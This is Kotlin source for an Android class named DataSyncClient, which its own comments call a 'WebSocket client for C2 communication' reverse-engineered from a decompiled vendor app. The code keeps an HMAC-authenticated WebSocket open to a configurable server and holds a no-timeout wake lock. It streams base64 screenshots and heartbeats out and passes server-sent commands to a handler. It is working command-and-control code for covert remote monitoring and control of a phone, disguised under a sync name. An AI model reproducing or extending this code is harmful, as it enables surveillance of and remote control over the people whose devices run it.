package com.storm.safe.rock.network

import android.content.Context
import android.os.PowerManager
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/**
 * WebSocket client for C2 communication.
 *
 * Reverse-engineered from JADX reference: C0267a0.java (DataSyncClient).
 * Handles WebSocket connection lifecycle, message sending/receiving,
 * HMAC-based authentication, and connection state management.
 */
open class DataSyncClient(
    private val context: Context,
    private val onMessageCallback: (String) -> Unit,
    private val onConnectionChanged: (Boolean) -> Unit,
    private val onCommandCallback: ((CommandRequest) -> Unit)? = null
) {

    companion object {
        private const val TAG = "DataSyncClient"
        private const val CONNECT_TIMEOUT_MS = 12000L
        private const val STUCK_TIMEOUT_MS = 15000L
        private const val WS_CLOSE_NORMAL = 1000
        private const val WS_CLOSE_REASON = "Client disconnect"
    }

    // --- Public fields (settable from outside, matching vendor pattern) ---

    var serverUrl: String = ""
    var deviceId: String = ""
    var deviceKeySalt: String = ""

    @Volatile
    var isConnected: Boolean = false

    @Volatile
    var isConnecting: Boolean = false

    @Volatile
    var connectStartTime: Long = 0L

    // --- Private fields ---

    @Volatile
    private var webSocket: WebSocket? = null

    @Volatile
    private var connectTimestamp: Long = 0L

    private val lock = Object()

    private var wakeLock: PowerManager.WakeLock? = null

    private val httpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(10L, TimeUnit.SECONDS)
        .readTimeout(0L, TimeUnit.SECONDS)
        .writeTimeout(10L, TimeUnit.SECONDS)
        .pingInterval(20L, TimeUnit.SECONDS)
        .retryOnConnectionFailure(false)
        .build()

    // --- Public methods ---

    /**
     * Connect to the WebSocket server.
     * Synchronized on [lock]. Skips if already connected.
     * If connecting for > 12s, resets and retries.
     */
    fun connect() {
        synchronized(lock) {
            if (isConnected) {
                Log.d(TAG, "Already connected, skip")
                return
            }
            if (isConnecting) {
                val elapsed = System.currentTimeMillis() - connectStartTime
                if (elapsed < CONNECT_TIMEOUT_MS) {
                    Log.d(TAG, "Connecting in progress (${elapsed}ms), skip")
                    return
                }
                Log.w(TAG, "Connect timeout (${elapsed}ms), resetting")
                isConnected = false
                isConnecting = false
                connectStartTime = 0L
            }
            if (serverUrl.isEmpty() || deviceId.isEmpty()) {
                Log.e(TAG, "Server URL or device ID not configured")
                return
            }
            isConnecting = true
            connectStartTime = System.currentTimeMillis()
            Log.i(TAG, "Connecting to: $serverUrl")
            try {
                val wsUrl = generateWsUrl()
                val timestamp = System.currentTimeMillis()
                val request = Request.Builder()
                    .url(wsUrl)
                    .header("Connection", "Upgrade")
                    .header("Upgrade", "websocket")
                    .build()
                val newWebSocket = httpClient.newWebSocket(request, createWebSocketListener(timestamp))
                synchronized(lock) {
                    if (!isConnecting) {
                        newWebSocket.cancel()
                        return
                    }
                    webSocket?.let {
                        try { it.cancel() } catch (_: Exception) {}
                    }
                    webSocket = newWebSocket
                    connectTimestamp = timestamp
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to create WebSocket", e)
                resetState()
            }
        }
    }

    /**
     * Generate the WebSocket URL with HMAC authentication key.
     *
     * Format: `wss://{host}/ws/session?sessionId={deviceId}&key={hmacKey}`
     * - Uses `wss://` for https/wss server URLs, `ws://` for http/ws
     * - HMAC key = first 32 chars of HmacSHA256(deviceKeySalt, deviceId) in hex
     */
    fun generateWsUrl(): String {
        val scheme = if (serverUrl.startsWith("https", ignoreCase = true) ||
            serverUrl.startsWith("wss", ignoreCase = true)
        ) "wss" else "ws"

        val host = serverUrl
            .replace("http://", "")
            .replace("https://", "")
            .replace("ws://", "")
            .replace("wss://", "")
            .trimEnd('/')

        val hmacKey = generateHmacKey()

        return "$scheme://$host/ws/session?sessionId=$deviceId&key=$hmacKey"
    }

    /**
     * Disconnect from the WebSocket server.
     * Closes with code 1000, evicts connection pool, releases WakeLock.
     */
    fun disconnect() {
        synchronized(lock) {
            Log.i(TAG, "Disconnecting")
            connectTimestamp = 0L
            try {
                webSocket?.close(WS_CLOSE_NORMAL, WS_CLOSE_REASON)
            } catch (_: Exception) {}
            webSocket = null
            isConnected = false
            isConnecting = false
            connectStartTime = 0L
        }
        try {
            httpClient.connectionPool.evictAll()
        } catch (_: Exception) {}
        releaseWakeLock()
        onConnectionChanged(false)
    }

    /**
     * Send a raw message string over the WebSocket.
     * Returns false if not connected or WebSocket is null.
     */
    open fun send(message: String): Boolean {
        synchronized(lock) {
            if (!isConnected) return false
            val ws = webSocket ?: return false
            return try {
                ws.send(message)
            } catch (e: Exception) {
                Log.w(TAG, "Send failed: ${e.message}")
                false
            }
        }
    }

    /**
     * Send a status message wrapping [data] in a standard envelope.
     * Format: `{"type":"status","sessionId":"...","data":{...},"timestamp":...}`
     */
    fun sendStatus(data: JSONObject): Boolean {
        if (!isConnected) return false
        return try {
            val envelope = JSONObject().apply {
                put("type", "status")
                put("sessionId", deviceId)
                put("data", data)
                put("timestamp", System.currentTimeMillis())
            }
            send(envelope.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send status", e)
            false
        }
    }

    /**
     * Send a screenshot frame over the WebSocket.
     * Format: `{"type":"screen_frame","sessionId":"...","data":{"image":"...","width":0,"height":0,"mode":"...","timestamp":...},"timestamp":...}`
     */
    fun sendScreenshot(base64Image: String, mode: String) {
        try {
            val frameData = JSONObject().apply {
                put("image", base64Image)
                put("width", 0)
                put("height", 0)
                put("mode", mode)
                put("timestamp", System.currentTimeMillis())
            }
            val envelope = JSONObject().apply {
                put("type", "screen_frame")
                put("sessionId", deviceId)
                put("data", frameData)
                put("timestamp", System.currentTimeMillis())
            }
            send(envelope.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send screenshot", e)
        }
    }

    /**
     * Check if the connection is stuck in "connecting" state for > 15s.
     * If so, force reset all state and cancel the WebSocket.
     */
    fun checkStuckConnection() {
        synchronized(lock) {
            if (isConnecting) {
                val elapsed = System.currentTimeMillis() - connectStartTime
                if (elapsed > STUCK_TIMEOUT_MS) {
                    Log.w(TAG, "Connection stuck (${elapsed}ms), force resetting")
                    isConnected = false
                    isConnecting = false
                    connectStartTime = 0L
                    try {
                        webSocket?.cancel()
                    } catch (_: Exception) {}
                    webSocket = null
                }
            }
        }
    }

    /**
     * Handle an incoming WebSocket text message.
     * Parses JSON and dispatches based on "type" field:
     * - "pong": ignored
     * - "probe" / "ping_probe": respond with status message
     * - "command": extract "data" object and dispatch to [onMessageCallback]
     */
    fun handleMessage(text: String) {
        try {
            val json = JSONObject(text)
            val type = json.optString("type", "")
            when (type) {
                "pong" -> {
                    // Ignored
                }
                "probe", "ping_probe" -> {
                    Log.d(TAG, "Received probe ($type), responding with status")
                    respondToProbe()
                }
                "command" -> {
                    val data = json.optJSONObject("data")
                    if (data != null) {
                        val request = CommandRequest.fromJson(data)
                        if (request.command.isNotEmpty()) {
                            if (onCommandCallback != null) {
                                onCommandCallback.invoke(request)
                            } else {
                                onMessageCallback(data.toString())
                            }
                        }
                    }
                }
                else -> {
                    // Unknown type, ignored
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse message", e)
        }
    }

    /**
     * Reset all connection state and notify disconnection.
     * Called on failure or forced disconnect.
     */
    fun resetState() {
        synchronized(lock) {
            isConnected = false
            isConnecting = false
            connectStartTime = 0L
            webSocket = null
            try {
                httpClient.connectionPool.evictAll()
            } catch (_: Exception) {}
            releaseWakeLock()
        }
        onConnectionChanged(false)
    }

    // --- Private helpers ---

    private fun generateHmacKey(): String {
        return try {
            val mac = Mac.getInstance("HmacSHA256")
            val keyBytes = deviceKeySalt.toByteArray(Charsets.UTF_8)
            mac.init(SecretKeySpec(keyBytes, "HmacSHA256"))
            val digest = mac.doFinal(deviceId.toByteArray(Charsets.UTF_8))
            // Format each byte as 2-char hex, take first 32 chars (16 bytes)
            digest.joinToString("") { String.format("%02x", it) }
                .substring(0, 32)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to generate HMAC key", e)
            ""
        }
    }

    private fun respondToProbe() {
        synchronized(lock) {
            if (!isConnected) return
            val innerData = JSONObject().apply {
                put("type", "device_heartbeat")
                put("deviceId", deviceId)
                put("timestamp", System.currentTimeMillis())
            }
            val envelope = JSONObject().apply {
                put("type", "status")
                put("sessionId", deviceId)
                put("data", innerData)
                put("timestamp", System.currentTimeMillis())
            }
            val ws = webSocket
            if (ws != null) {
                ws.send(envelope.toString())
            } else {
                // Fallback: use the open send() method
                send(envelope.toString())
            }
        }
    }

    private fun acquireWakeLock() {
        try {
            if (wakeLock == null) {
                val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                wakeLock = pm?.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "app:SyncLock"
                )?.apply {
                    setReferenceCounted(false)
                }
            }
            val wl = wakeLock
            if (wl != null && !wl.isHeld) {
                @Suppress("WakelockTimeout") // ADAPT: vendor uses no-timeout acquire (C1109qg)
                wl.acquire()
                Log.d(TAG, "WakeLock acquired")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to acquire WakeLock: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            val wl = wakeLock
            if (wl != null && wl.isHeld) {
                wl.release()
                Log.d(TAG, "WakeLock released")
            }
        } catch (_: Exception) {}
    }

    private fun createWebSocketListener(timestamp: Long): WebSocketListener {
        return object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                synchronized(lock) {
                    // Only accept if this is still the current connection attempt
                    if (connectTimestamp != timestamp) return
                    isConnected = true
                    isConnecting = false
                    Log.i(TAG, "WebSocket connected")
                    acquireWakeLock()
                }
                onConnectionChanged(true)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleMessage(text)
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.i(TAG, "WebSocket closing: $code $reason")
                webSocket.close(WS_CLOSE_NORMAL, null)
                resetState()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}")
                resetState()
            }
        }
    }
}
